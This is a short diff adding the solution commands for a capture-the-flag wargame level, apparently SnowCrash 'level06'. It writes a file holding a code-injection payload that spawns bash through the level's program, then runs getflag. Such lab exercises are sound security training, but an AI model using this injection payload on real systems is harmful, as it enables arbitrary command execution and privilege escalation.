@@ -1,0 +1,3 @@
+echo '[x ${${@system('bash')}}]' > /tmp/lol.txt
+./level06 /tmp/lol.txt
+getflag
